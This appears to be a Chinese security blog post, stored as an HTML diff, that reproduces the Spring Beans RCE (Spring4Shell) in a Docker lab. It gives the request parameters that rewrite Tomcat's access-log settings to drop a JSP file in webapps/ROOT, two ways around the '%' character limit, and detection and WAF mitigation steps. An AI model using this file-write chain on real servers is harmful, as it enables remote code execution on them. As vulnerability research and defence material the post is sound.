@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>Spring Beans RCE 复现</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-3/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Spring Beans RCE 复现'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-3/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-04-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-04T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-3/haha.jpg' />
+<meta name="twitter:title" content="Spring Beans RCE 复现">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-3/haha.jpg' />
+    <link rel="shortcut icon" href="img/avatar.png" />
+
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E5%A4%8D%E7%8E%B0-3/">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-3/haha_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/%E5%A4%8D%E7%8E%B0-3/haha_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/%E5%A4%8D%E7%8E%B0-3/haha_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post Spring Beans RCE 复现" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" >
+                漏洞复现
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/%E5%A4%8D%E7%8E%B0-3/">Spring Beans RCE 复现</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 04, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="spring-beans-rce-复现">Spring Beans RCE 复现</h1>
+<h2 id="影响范围">影响范围</h2>
+<ul>
+<li>JDK &gt;= 9</li>
+<li>使用了 Spring 框架及其衍生框架<code>spring-beans-*.jar</code>文件或存在<code>CachedIntrospectionResults.class</code></li>
+</ul>
+<h2 id="漏洞介绍">漏洞介绍</h2>
+<p>Spring MVC 框架的参数绑定功能支持将请求中的参数绑定到控制器方法中参数对象的成员变量，本质上就是参数绑定引发的变量覆盖漏洞。公开的利用链是通过求获取 AccessLogValve 对象并注入恶意字段值，从而触发 pipeline 机制实现任意路径下写文件。</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<h3 id="环境">环境</h3>
+<p>docker 镜像：</p>
+<pre tabindex="0"><code>docker pull vulfocus/spring-core-rce-2022-03-29:latest
+docker run -d -p 8080:8080 --name spring-core-rce vulfocus/spring-core-rce-2022-03-29
+</code></pre><h3 id="原理及利用">原理及利用</h3>
+<p>本质就是变量覆盖修改 tomcat 的 log 配置，实现在<code>webapp/path</code>下写入 jsp，实现命令执行。</p>
+<ul>
+<li>发送请求修改tomcat 日志文件名 和 路径</li>
+</ul>
+<pre tabindex="0"><code># 设置文件后缀为 .jsp
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+
+# 设置文件前缀为 shell
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+
+# 设置日志文件的路径为 webapps/path，只有该文件下的 jsp 文件会被解析
+class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+</code></pre><ul>
+<li>发送请求设置 log 的<code>pattern</code> 和 <code>fileDateFormat</code>，其中 pattern 具有固定格式，根据官方定义，pattern 的值可以是<code>common</code> 和 <code>combined</code></li>
+</ul>
+<pre tabindex="0"><code># common 的定义
+
+%a - Remote IP address. See also %{xxx}a below.
+%A - Local IP address
+%b - Bytes sent, excluding HTTP headers, or '-' if zero
+%B - Bytes sent, excluding HTTP headers
+%h - Remote host name (or IP address if enableLookups for the connector is false)
+%H - Request protocol
+%l - Remote logical username from identd (always returns '-')
+%m - Request method (GET, POST, etc.)
+%p - Local port on which this request was received. See also %{xxx}p below.
+%q - Query string (prepended with a '?' if it exists)
+%r - First line of the request (method and request URI)
+%s - HTTP status code of the response
+%S - User session ID
+%t - Date and time, in Common Log Format
+%u - Remote user that was authenticated (if any), else '-' (escaped if required)
+%U - Requested URL path
+%v - Local server name
+%D - Time taken to process the request in millis. Note: In httpd %D is microseconds. Behaviour will be aligned to httpd in Tomcat 10 onwards.
+%T - Time taken to process the request, in seconds. Note: This value has millisecond resolution whereas in httpd it has second resolution. Behaviour will be align to httpd in Tomcat 10 onwards.
+%F - Time taken to commit the response, in milliseconds
+%I - Current request thread name (can compare later with stacktraces)
+</code></pre><pre tabindex="0"><code># combined 定义
+
+%{xxx}a write remote address (client) (xxx==remote) or connection peer address (xxx=peer)
+
+%{xxx}i write value of incoming header with name xxx (escaped if required)
+
+%{xxx}o write value of outgoing header with name xxx (escaped if required)
+
+%{xxx}c write value of cookie with name xxx (escaped if required)
+
+%{xxx}r write value of ServletRequest attribute with name xxx (escaped if required)
+
+%{xxx}s write value of HttpSession attribute with name xxx (escaped if required)
+
+%{xxx}p write local (server) port (xxx==local) or remote (client) port (xxx=remote)
+
+%{xxx}t write timestamp at the end of the request formatted using the enhanced SimpleDateFormat pattern xxx
+</code></pre><p>本来是可以直接在 <code>pattern</code>中直接写入 payload，例如：</p>
+<pre tabindex="0"><code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=666
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25out.println(123);%25%3E
+</code></pre><p>结果出现错误，主要是因为写入的字符中包含<code>%</code>字符，该字符在日志配置中有特殊作用，因此报错如下：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 687; 
+			flex-basis: 1649px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404110130146.png" data-size="598x87">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404110130146.png"
+			width="598"
+			height="87"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404110130146_hu2e2f08fc3dbdfd9c1bfee9e8adc44420_20251_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-3/image-20220404110130146_hu2e2f08fc3dbdfd9c1bfee9e8adc44420_20251_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>所以尝试用<code>combined</code>中的一些定义尝试写入 webshell，避免<code>%</code>的直接写入：</p>
+<pre tabindex="0"><code># 法一：根据定义使用 `%{xxx}i` 从 HTTP Header 去读取值并写入
+
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=666
+
+GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7Di HTTP/1.1
+Host: IP:PORT
+cmd: &lt;%out.println(123);%&gt;
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 652; 
+			flex-basis: 1565px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404111544227.png" data-size="600x92">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404111544227.png"
+			width="600"
+			height="92"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404111544227_hua4dcec7267d62fbe696774a95f968f4b_20741_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-3/image-20220404111544227_hua4dcec7267d62fbe696774a95f968f4b_20741_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>法一存在缺陷，无法写入<code>&quot;</code>，存在转义：</strong></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 960; 
+			flex-basis: 2305px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404111817729.png" data-size="365x38">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404111817729.png"
+			width="365"
+			height="38"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404111817729_hu932f94cb42644f9c986cabfd86d07389_6358_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-3/image-20220404111817729_hu932f94cb42644f9c986cabfd86d07389_6358_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<pre tabindex="0"><code># 法二：根据定义使用 `%{xxx}t` 直接写入以 simpleDateFormat 格式定义的 timestamp，这个 timestamp 是可以包含 `%` 和 `&quot;` 字符
+
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=888
+
+GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25%7B%25%7Dtout.println(%22mytest%22);%25%7B%25%7Dt%3E HTTP/1.1
+Host: IP:PORT
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 677; 
+			flex-basis: 1625px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404112756751.png" data-size="596x88">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404112756751.png"
+			width="596"
+			height="88"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-3/image-20220404112756751_hu86292364a750163b8317ef225ca676bb_16104_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-3/image-20220404112756751_hu86292364a750163b8317ef225ca676bb_16104_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="排查与修复">排查与修复</h2>
+<ul>
+<li>
+<p>排查</p>
+<ul>
+<li>jdk 版本</li>
+<li>不论是 war 包还是 jar 包，解压后排查<code>spring-beans-*.jar</code>格式的文件、排查<code>CachedIntrospectionResuLts.class</code>文件</li>
+</ul>
+</li>
+<li>
+<p>临时修复</p>
+<ul>
+<li>
+<p>依靠 WAF 规则中对参数中所有出现的 <code>class.*</code>， <code>Class.*</code>，<code>*.class.*</code>， <code>*.Class.*</code> 字符串过滤</p>
+</li>
+<li>
+<p>在应用中全局搜索<code>@InitBinder</code>注解，看看方法体内是否调用<code>dataBinder.setDisallowedFields</code>方法，如果发现此代码片段的引入，则在原来的黑名单中，添加<code>{&quot;class.&quot;,&quot;Class.&quot;,&quot;.class.&quot;, &quot;.Class.&quot;}</code></p>
+<blockquote>
+<p>如果此代码片段使用较多,需要每个地方都追加</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/%E5%A4%8D%E7%8E%B0-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pkexec 本地提权"
+                        data-key="复现-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">pkexec 本地提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/%E5%A4%8D%E7%8E%B0-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Activemq 任意文件写入漏洞"
+                        data-key="复现-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Activemq 任意文件写入漏洞</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-5/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-5/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post thinkphp5.1.* - 反序列化"
+                        data-key="php-5" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">thinkphp5.1.* - 反序列化</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#影响范围">影响范围</a></li>
+    <li><a href="#漏洞介绍">漏洞介绍</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a>
+      <ol>
+        <li><a href="#环境">环境</a></li>
+        <li><a href="#原理及利用">原理及利用</a></li>
+      </ol>
+    </li>
+    <li><a href="#排查与修复">排查与修复</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
